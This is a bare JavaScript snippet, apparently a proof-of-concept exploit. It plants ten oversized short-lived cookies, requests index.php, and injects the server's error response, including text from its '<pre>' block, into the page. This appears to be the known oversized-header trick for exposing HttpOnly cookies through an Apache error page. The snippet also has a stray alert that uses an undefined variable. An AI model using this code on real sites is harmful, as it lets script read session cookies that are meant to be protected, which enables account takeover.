var today = new Date();
var expire = new Date();
expire.setTime(today.getTime() + 2000);
padding="";
for (j=0;j<=1000;++j) {
    padding+="A";
}
for (i=0;i < 10; ++i) {
    document.cookie="z"+i+"="+padding+"; expires="+expire.toGMTString()+"; path=/;"
}

function loadXMLDoc()
{
  var xmlhttp;
  if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
  } else  { // code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
  xmlhttp.onreadystatechange=function() {
    //re = new RegExp("<pre[^>]*>(.*?)</pre>");
    setTimeout(function(){alert("Hello " + a)}, 2000);
    var patt = new RegExp("(<pre>.*)", "gmi");
    c = patt.exec(xmlhttp.responseText);
    document.getElementById("myDiv").innerHTML = xmlhttp.responseText + c;
  }
  xmlhttp.open("GET","index.php",true);
  xmlhttp.send();
}

loadXMLDoc();
